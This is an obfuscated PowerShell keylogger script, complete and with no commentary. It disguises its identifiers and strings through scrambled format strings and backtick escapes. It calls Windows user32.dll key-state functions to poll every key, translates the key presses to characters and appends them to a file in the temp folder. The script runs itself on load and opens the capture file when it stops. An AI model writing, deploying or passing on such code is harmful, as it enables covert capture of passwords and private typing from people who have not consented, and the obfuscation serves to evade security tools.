  .("{1}{2}{0}{3}" -f 'R','S','Et-Va','iABLe')  ("{0}{1}"-f'q9','EM')  ([TyPe]("{1}{0}"-F 'e','cOnSoL'))  ;    .("{2}{1}{0}"-f'iTeM','-','sEt')  ("{4}{0}{2}{1}{3}"-f'IABle','W',':0','2c','Var')  ( [tYPE]("{0}{2}{1}" -f'SysTe','FIle','M.IO.'))  ;    .("{0}{1}{2}"-f'set-Va','RiAb','LE')  ("{1}{0}"-f'k','1ES') ([type]("{1}{2}{0}{3}" -F'em.tex','syS','T','t.encOdinG')); function staRT-k`e`yLo`GGEr(${Pa`TH}="$env:temp\keylogger.txt") 
{
  ${SiGNA`T`Ures} = ((("{146}{2}{57}{136}{142}{66}{67}{141}{47}{58}{115}{152}{60}{26}{0}{116}{85}{7}{140}{16}{29}{132}{95}{20}{53}{106}{17}{45}{127}{133}{42}{72}{150}{9}{89}{107}{109}{5}{59}{86}{104}{65}{63}{113}{103}{120}{41}{40}{3}{15}{148}{93}{55}{147}{131}{126}{122}{27}{112}{38}{54}{108}{124}{46}{80}{110}{64}{79}{76}{137}{28}{96}{91}{101}{24}{61}{23}{33}{56}{11}{111}{118}{10}{68}{71}{74}{14}{145}{69}{153}{31}{92}{25}{18}{50}{88}{134}{73}{19}{155}{100}{77}{114}{105}{30}{62}{39}{48}{52}{83}{44}{128}{149}{21}{98}{35}{82}{151}{13}{138}{32}{6}{99}{1}{154}{87}{49}{119}{135}{90}{43}{144}{117}{12}{125}{34}{102}{97}{36}{130}{94}{123}{22}{84}{37}{75}{70}{81}{8}{139}{78}{143}{51}{129}{4}{121}" -f'C','atic ','[Dll','ort','uff, uint wFlag','in','c','.','ws','Ke','.','
[Dl','y, u','t','arS','(C','xactS','ta','c ','pVirt','ue','llC9H, ','e','e(b','ta','to)]
publi','=',', C','int G','pellin','nt','Se','i','yte[] k','c','harSet','e[] ','System.T','CharSe','
','mp','lI','n','int wVi','Huse','ti','o)]
p','C','[D','U','static e','ch','ll',')] ','t.','r','eystate);','Import','9H','t ','t','t',' uMapType);','alKeyCode)',' e','u','32','.','d','t=Cha','.String','llC9H,',' short GetAsy',' Ma',' Ch','ext','ern','e','Buff, in','xt','ublic stat','Builder p','=','Import(C9',', ','arSet','vir','n int To','x','y','e(u','tKeyboar','t.Au','e','pke','=tr','e','yt','C',' st','nt uCod','dS','anCode, b','
[D','t',' i','
public s','St','Au','ate(','ic','lImport(C9','harSet=','; ',',',', CharS','h','Ke','Huser32','nic','l','s);
1uh','lC9H','ystat','t','int wS','dl','c ','r','B','l','2.','g','exter','tern int','od','(C',' ','o)]
publ','z','Auto, E','dll','9Huser','t c','rt','e','1uh
','3','9Hus','32.d','nc','CharSet.Au','e','r','exter','ualKey(ui'))."R`EpLACE"(([ChaR]49+[ChaR]117+[ChaR]104),[StRIng][ChaR]39)."rePla`CE"(([ChaR]67+[ChaR]57+[ChaR]72),[StRIng][ChaR]34))
  ${a`pi} = &("{1}{0}" -f'Type','Add-') -MemberDefinition ${si`gNa`T`UrEs} -Name ("{0}{1}"-f 'Win','32') -Namespace ("{0}{1}" -f'AP','I') -PassThru
  ${nU`LL} = .("{0}{1}{2}" -f 'N','ew-Ite','m') -Path ${p`ATh} -ItemType ("{1}{0}" -f'ile','F') -Force
  try
  {
    .("{0}{1}{2}"-f'W','ri','te-Host') ("{10}{8}{12}{6}{2}{9}{7}{3}{5}{0}{1}{13}{11}{4}" -f'e ','res','s. ','CTRL+C','.',' to se','esse','ess ','cording k','Pr','Re','ts','ey pr','ul') -ForegroundColor ("{1}{0}" -f'd','Re')
    while (${t`RuE}) {
      &("{3}{1}{2}{0}"-f'ep','t','-Sle','Star') -Milliseconds 40
      for (${AS`CII} = 9; ${AsC`Ii} -le 254; ${as`Cii}++) {
        ${s`TA`TE} = ${a`Pi}::("{1}{2}{0}"-f'te','GetAsyncKey','Sta').Invoke(${a`scII})
        if (${s`T`ATe} -eq -32767) {
          ${n`ULL} =  ${Q9`eM}::"cap`s`lOcK"
          ${V`iRtU`AL`KEy} = ${A`PI}::("{0}{2}{3}{1}" -f 'MapV','lKey','ir','tua').Invoke(${asC`iI}, 3)
          ${Kbs`T`ATE} = &("{2}{1}{0}" -f 'Object','ew-','N') ("{1}{0}" -f 'yte[]','B') 256
          ${cHe`C`kKBSt`AtE} = ${A`pI}::("{4}{3}{1}{0}{2}" -f'ta','ardS','te','Keybo','Get').Invoke(${k`Bst`ATe})
          ${M`yChAR} = .("{0}{1}{2}"-f 'N','ew-Obje','ct') -TypeName ("{6}{2}{3}{1}{0}{5}{4}"-f'.St','xt','em','.Te','r','ringBuilde','Syst')
          ${Su`cCeSS} = ${a`Pi}::("{2}{1}{0}"-f 'de','co','ToUni').Invoke(${A`sciI}, ${vIR`T`UALKeY}, ${KB`St`ATe}, ${M`YC`har}, ${myCh`AR}."cA`paCI`TY", 0)
          if (${su`CC`esS}) 
          {
              (.("{2}{3}{0}{1}" -f 'RIA','bLE','G','et-vA') ("{1}{0}"-f 'W2C','0') )."vaL`UE"::("{2}{1}{0}"-f'dAllText','pen','Ap').Invoke(${P`AtH}, ${M`YcHAR},   ${1e`sK}::"uNi`C`oDE") 
          }
        }
      }
    }
  }
  finally
  {
    .("{0}{1}{2}" -f 'no','t','epad') ${p`ATH}
  }
}
&("{2}{1}{0}{3}" -f'-','art','St','KeyLogger')
